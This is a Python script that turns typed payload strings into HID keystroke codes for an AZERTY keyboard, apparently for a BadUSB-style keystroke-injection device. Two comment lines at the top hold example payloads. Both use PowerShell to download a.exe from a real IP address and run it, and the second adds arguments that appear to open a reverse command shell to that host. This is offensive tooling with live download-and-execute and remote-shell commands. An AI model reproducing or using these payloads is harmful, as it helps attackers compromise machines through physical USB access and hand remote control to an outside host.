import sys

#GUI WAIT powershell.exe Invoke-WebRequest -Uri 'http://51.38.237.141/a.exe' -OutFile '%appdata%.exe'; start %appdata%.exe ENTER

#GUI WAIT powershell.exe Invoke-WebRequest -Uri 'http://51.38.237.141/a.exe' -OutFile '%appdata%.exe'; cmd.exe /C start %appdata%.exe 51.38.237.141 999 -e cmd ENTER

dico = {
  "q": "0x4",
  "b": "0x5",
  "c": "0x6",
  "d": "0x7",
  "e": "0x8",
  "f": "0x9",
  "g": "0xa",
  "h": "0xb",
  "i": "0xc",
  "j": "0xd",
  "k": "0xe",
  "l": "0xf",
  ",": "0x10",
  "n": "0x11",
  "o": "0x12",
  "p": "0x13",
  "a": "0x14",
  "r": "0x15",
  "s": "0x16",
  "t": "0x17",
  "u": "0x18",
  "v": "0x19",
  "z": "0x1a",
  "x": "0x1b",
  "y": "0x1c",
  "w": "0x1d",
  "&": "0x1e",
  "é": "0x1f",
  "\"": "0x20",
  "\'": "0x21",
  "(": "0x22",
  "-": "0x23",
  "è": "0x24",
  "_": "0x25",
  "ç": "0x26",
  "à": "0x27",
  "ENTER": "0x28",
  "ESCAPE": "0x29",
  #0x2a ??
  #0x2b ??
  "SPACE": "0x2c",
  ")": "0x2d",
  "=": "0x2e",
  #0x2f ??
  "$": "0x30",
  "*": "0x31",
  #0x32 ??
  "m": "0x33",
  "ù": "0x34",
  "²": "0x35",
  ";": "0x36",
  ":": "0x37",
  "CAPSLOCK": "0x39",
  "CONTROLF": "0x3c",
  "DATETIME": "0x3e",
  "IMPRECR": "0x46",
  "LEFTARROW": "0x4a",
  "TOPLEFT": "0x4d",
  "ROGHTARROW": "0x4f"
}


if len(sys.argv) != 2:
    print("Please entre your payload. (python Generator.py \"my pretty payload\")")
    exit()

payload_parsed = sys.argv[1].replace(" ", "DUMMYSPACEDUMMY")
payload_splitted = payload_parsed.split("DUMMY")

payload_cutted = []
commons = ["GUI", "WAIT", "ENTER", "ENTER", "ESCAPE", "CAPSLOCK", "IMPRECR", "SPACE", "CONTROLF", "DATETIME", "LEFTARROW", "ROGHTARROW", "TOPLEFT"]

for instructions in payload_splitted:
    if instructions in commons:
        payload_cutted.append(instructions)
    else:
        for elem in list(instructions):
            payload_cutted.append(elem)

def generate(payload_cutted):
    result = []
    for char in payload_cutted:
        if char == "1":
            result.append("0x1e, ")
            result.append("0x2, ")
        elif char == "2":
            result.append("0x1f, ")
            result.append("0x2, ")
        elif char == "3":
            result.append("0x20, ")
            result.append("0x2, ")
        elif char == "4":
            result.append("0x21, ")
            result.append("0x2, ")
        elif char == "5":
            result.append("0x22, ")
            result.append("0x2, ")
        elif char == "6":
            result.append("0x23, ")
            result.append("0x2, ")
        elif char == "7":
            result.append("0x24, ")
            result.append("0x2, ")
        elif char == "8":
            result.append("0x25, ")
            result.append("0x2, ")
        elif char == "9":
            result.append("0x26, ")
            result.append("0x2, ")
        elif char == "0":
            result.append("0x27, ")
            result.append("0x2, ")
        elif char == ".":
            result.append("0x36, ")
            result.append("0x2, ")
        elif char == "GUI":
            result.append("0x15, ")
            result.append("0x8, ")
        elif char == "/":
            result.append("0x37, ")
            result.append("0x2, ")
        elif char == "F":
            result.append("0x9, ")
            result.append("0x2, ")
        elif char == "R":
            result.append("0x15, ")
            result.append("0x2, ")
        elif char == "E":
            result.append("0x8, ")
            result.append("0x2, ")
        elif char == "I":
            result.append("0xc, ")
            result.append("0x2, ")
        elif char == "W":
            result.append("0x1d, ")
            result.append("0x2, ")
        elif char == "U":
            result.append("0x18, ")
            result.append("0x2, ")
        elif char == "C":
            result.append("0x6, ")
            result.append("0x2, ")
        elif char == "S":
            result.append("0x16, ")
            result.append("0x2, ")
        elif char == "P":
            result.append("0x13, ")
            result.append("0x2, ")
        elif char == "A":
            result.append("0x14, ")
            result.append("0x2, ")
        elif char == "Y":
            result.append("0x1c, ")
            result.append("0x2, ")
        elif char == "L":
            result.append("0xf, ")
            result.append("0x2, ")
        elif char == "O":
            result.append("0x12, ")
            result.append("0x2, ")
        elif char == "D":
            result.append("0x7, ")
            result.append("0x2, ")
        elif char == "%":
            result.append("0x34, ")
            result.append("0x2, ")
        elif char == "WAIT":
            result.append("0x0, ")
            result.append("0xff, ")
            result.append("0x0, ")
            result.append("0xff, ")
            result.append("0x0, ")
            result.append("0xff, ")
            result.append("0x0, ")
            result.append("0xeb, ")
        else:
            result.append(str(dico[char]) + ", ")
            result.append("0x0, ")
    print(''.join(result) + "\nLEN : " + str(len(result)))
generate(payload_cutted)